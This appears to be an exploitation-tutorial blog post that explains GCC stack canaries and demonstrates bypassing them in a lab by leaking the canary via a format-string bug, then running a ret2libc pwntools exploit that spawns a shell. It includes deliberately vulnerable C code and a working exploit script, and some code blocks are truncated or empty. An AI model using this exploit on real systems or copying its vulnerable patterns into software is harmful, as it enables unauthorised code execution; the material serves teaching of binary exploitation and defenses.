#### Compiling without no-stack-protector

Greetings dear potential binary exploiters. Following the precedent posts where we discussed a bit about buffer overflow vulnerabilities and how to write exploits for them, today we are going to talk about stack canaries.

As we remember, in the previous posts we used to compile our vulnerable program disabling the protection mechanisms on the stack (no-stack-protector, no-pie options). Before we start, let us inspect what happens if we compile the program without disabling them. We start from our simple(st) vulnerable program:

```C
#include <stdio.h>

void greet_me()
{
  char name[200];
  gets(name);
  printf("Hi there %s !!\n",name);
}

int main(int argc, char *argv[])
{
  greet_me();
  return 0; 
}
```
And we compile it like this:

```
gcc -w vuln.c -o vuln -D_FORTIFY_SOURCE=0
```
Then we try to overflow the buffer by sending a lot of As, as usual:
```
lab@lab-VirtualBox:~/canary$ ./vuln_canary 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hi there AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA !!
*** stack smashing detected ***: <unknown> terminated
```
But this time we notice that the program terminates withouth the typical overflow. Instead we see a "stack smashing detected" followed by a "terminated". So the program somehow detects the buffer overflow, and terminates the program right away leaving no room for any exploit to work.

#### Stack canaries

What happened in here is that, as it wasn't disabled, GCC compiled the program enabling stack canaries. The term Stack Canaries paraphrases the [Canary in a coal mine](https://en.wiktionary.org/wiki/canary_in_a_coal_mine), that was a protection mechanism for miners, working in coal mines back then in the early 20th century. The miners would bring an actual canary inside the mine, whenever the canary died it was time to leave the mine for food, before facing death due to air intoxication. The following image extracted from Ch0pin's blog shows a sample canary:

[!canarimine](https://miro.medium.com/max/1400/0*PgNurmyrOS3WVsAs.jpg)


The thing works in a similar way here in the stack. This mechanism starts from the fact that an attacker will try to overflow the stack, that is, to overwrite memory, writting stuff when it should not be done. Assume that at the beginning of a function call (e.g. during its prologue) we are saving a value in the functionâ€™s stack frame, we would expect (! if everything went well !) to read the same value just before the function exits or namely at its epilogue. If the value has changed, then the execution of the program will be terminated and an error message will be displayed.

Visually, we can see that stack canaries work like in the following diagram:

[!canary](https://miro.medium.com/max/562/1*bHpEk6RPDTfdU2bIdVspbQ.png)

Now if we go back to our previous program, compiled without deactivating the stack protector, we see the following before and after the greet_me function:

[0x5555555546fa]> 
```
As we see, before the function starts the program loads the content from qword fs:[0x28] into local_8h that is on the stack. Then it retrieves back its value and compares with that initial value, to see if they match. If they don't, the program won't return avoiding the execution of a potential exploit, as we saw. Instead it will jump to a function that will basically prompt the stack smash string and exit() as safely as possible.


In radare2, we can check if stack canaries are enabled on an executable file like this:
```
[0x5555555545f0]> i~pic,canary,nx,crypto,stripped,static,relocs
file     /home/lab/canary/vuln_base
canary   true
crypto   false
nx       true
pic      true
relocs   false
static   false
stripped true
[0x5555555545f0]> 
```

And we can debug the program to inspect the stack canary value at the start of the function:
```

[0x5555555546fa]> dr rax
0x22bb275bb4188b00
```
As we see it is stored on the stack, before the saved registers and the frame pointer:
```
[0x5555555546fa]> pxw @ rbp-0x8
0x7fffffffdf98  0xb4188b00 0x22bb275b 0xffffdfc0 0x00007fff  ....['."........
0x7fffffffdfa8  0x55554773 0x00005555 0xffffe0a8 0x00007fff  sGUUUU..........
```
And then retrieved at the end to check for over-writes:
```
|           0x555555554744      488b45f8       mov rax, qword [local_8h]

[0x555555554748]> dr rax
0x22bb275bb4188b00
[0x555555554748]> 
```
We can re-run and debug the program many times to see how the stack canary, in our case, changes every time.

We can also prompt its value in a more visual and easy way by using the following C program:
```C
#include <stdio.h>

#define unsigned_long_int unsigned long int

void greet_me()
{
    char name[200];
    register void *rsp asm ("%rsp");
    register void *rbp asm ("%rbp");
    unsigned_long_int size = ((rbp + 8 * 2) - rsp) / 8;
    

    printf("-----SZ: %lld | RSP: %llx | RBP: %llx ---------------\n",rsp,rbp);
    printf("[+] Canary value: %llx\n",*((unsigned_long_int*) (rbp-0x8)));
    printf("---------------------------------------------------------\n");
}

void greet_me_again()
{
    char name[200];
    register void *rsp asm ("%rsp");
    register void *rbp asm ("%rbp");
    unsigned_long_int size = ((rbp + 8 * 2) - rsp) / 8;
    

    printf("-----SZ: %lld | RSP: %llx | RBP: %llx ---------------\n",rsp,rbp);
    printf("[+] Canary value: %llx\n",*((unsigned_long_int*) (rbp-0x8)));
    printf("---------------------------------------------------------\n");

}


int main(int argc, char *argv[])
{
    greet_me();
    greet_me_again();
    return 0;  
}
```
In here, we see that the canary will be the same, same value for every function call inside our program:
```
lab@lab-VirtualBox:~/canary$ ./vuln 88
-----SZ: 140737488346864 | RSP: 7fffffffdfd0 | RBP: 555555554860 ---------------
[+] Canary value: b3cf9bf71e2dfa00
---------------------------------------------------------
-----SZ: 140737488346864 | RSP: 7fffffffdfd0 | RBP: 7ffff7af2104 ---------------
[+] Canary value: b3cf9bf71e2dfa00
---------------------------------------------------------
lab@lab-VirtualBox:~/canary$ 
```
Which is particuarly good, as if we are able to retrieve the canary value in execution, we will be able to safely attack every function.

#### Canary types

There is not a single type of stack canary, the following [SANS article](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/) describes them very well. But to summarize it a little bit for our case, we'll usually encounter Terminator canaries: consisting of at least one string terminating character (new line, null e.t.c.) and the idea is that since most overflow vulnerabilities occur from functions such as gets(), strcpy(), the attacker wonâ€™t be able to include them in the payload. Random canaries: consisting of a random byte sequence that is not known to the attacker. And Random XOR: consisting of a random value (as above) XORâ€™ed with a mask constructed from the adjacent frame pointer and return address. 

Terminator canaries work very well by limiting the buffer lenght, cutting the payload automatically as 0x00 terminates the string. Random canaries such as our case work by comparing a randomly generated value though they may be useless if the program also has a memory leak vulnerability allowing the attacker to retrieve that randomly generated value. XOR canaries work similarly and suffer from similar vulnerabilities, adding an extra step of difficulty. 

Since version 2.7.2.2 GCC includes the StackGuard extension [check it here](https://github.com/gcc-mirror/gcc/blob/master/libssp/ssp.c) enabling the use of random canaries. The compiler will add code in the function prolog and epilog enabling the canary. 

#### Bypassing StackGuard with memory leaks

So in general terms we'll bypass the StackGuard by accessing the stack canary value in two ways: either by bruteforcing for the canary value or by abusing a memory leak to retrieve its value. BananaMafia has a nice tutorial on [Bruteforcing the canary](https://bananamafia.dev/post/binary-canary-bruteforce/) In here we will go for the memory leak approach:

So we'll start with this program, that basically is the same as the previous one except for that it reads a parameter from argv:
```C
#include <stdio.h>
#define unsigned_long_int unsigned long int
void greet_me(char *input)
{
    char name[200];
    printf(input);
    printf("\n")
    gets(name);
    printf("Hi there %s !!\n",name);
}
int main(int argc, char *argv[])
{
    greet_me(argv[1]);
    return 0;  
}
```
And it is vulnerable to a [format string](https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b) vulnerability. 

So we see that format strings like %s, %d etc can be used to specify a data format. The [full list for C is here](https://cplusplus.com/reference/cstdio/printf/). So %d will go for the decimal integer, c for character and...x for hexadecimal... Also, we can specify the length: for example ll will stand for long long int. And we can combine them together so llx will specify an x64 address!

Going back to our program, we see it basically sends the content of the first argument sent to the program straight to printf, without any checks nor additional format specifications inside the program. So if we send a buffer containing only format specifiers, without any actual text nor data, the program will try to refeer to the data on the stack thus leaking memory, in our format of interest:

We can try to send the following buffer as the argument:
```
%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx
```
And we will see the memory leaks:
```
lab@lab-VirtualBox:~/canary$ ./vuln_canary %llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx

```
Having previously reversed our program we can easily identify something that resembles our canary:
```
lab@lab-VirtualBox:~/canary$ ./vuln_canary  %33\$llx
7e791a4e294e1100

Hi there  !!
lab@lab-VirtualBox:~/canary$ 
lab@lab-VirtualBox:~/canary$ ./vuln_canary  %33\$llx
85f4f9bb91ee7100
```
There it is!

From this point, writting the exploit is very easy if we understand the fundamentals. We just need to 1) automatically retrieve the canary by a memory leak 2) overflow/overwrite the stack placing the (retrieved) value of the canary in its position (local_8h). Then proceed with the exploit as usual.

[!stack](https://miro.medium.com/max/1400/1*VV_5Nf_jCSYzjTdkrX_2YQ.png)


So we can kind of re-craft our exploit by using the return from libc technique, previously discussed in this blog.

We start by searching inside libc:
```
[0x555555554630]> e search.from=0x7ffff7dd3000
[0x555555554630]> e search.to=0x7ffff7dfc000
```
Retrieving ret, pop rdi; ret and the addresses from system, bin/sh and exit. So we can launch a shell:
```
[0x555555554630]> /R ret
  0x7ffff7dd336c       69374ab593d1  imul esi, dword [rdi], 0xd193b54a

And then we can integrate them into a function exploit. In here I used pwntools [That can be easilly installed following this guide](https://github.com/Gallopsled/pwntools-tutorial/blob/master/installing.md).

And I crafted the exploit like this. Note that we can either use the return from libc technique by finding libc (or any other if it fits) base address and then calling addresses relative from that point, or we can either just call those addresses directly (harcoding everything). Generally doing relative addresses from libc will be more useful as we face ASLR and/or work on different systems.
```Py
#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = context.binary = ELF('./vuln_canary')

libc_base_address = 0x7ffff79e2000

ret = libc_base_address+0x3F137A
# ret  = 0x7ffff7dd337a

pop_rdi = libc_base_address + 0x3F27FB
# pop_rdi = 0x7ffff7dd47fb

bin_sh = libc_base_address + 0x1B3D88
#bin_sh = 0x7ffff7b95d88 

_system = libc_base_address + 0x4F420
#_system = 0x7ffff7a31420

_exit = libc_base_address + 0x43110
# _exit =0x7ffff7a25110

print("[+] Spawning process...")

io = process([exe.path , "%33$llx"])
canary = int(io.readline().strip(),16)

print("[+] Canary leaked:{}".format(hex(canary)))

buf = b'A' * 200 

buf += p64(canary)
buf += b'\x42' * 8
buf += p64(ret)
buf += p64(pop_rdi)
buf += p64(bin_sh)
buf += p64(_system)
buf += p64(_exit)

with open('payload','wb') as payload:
    payload.write(buf)

io.sendline(buf)

io.interactive()
```
And after executing the exploit, no surprise, execution gained:
```

And that was it for today. Let's keep learning!
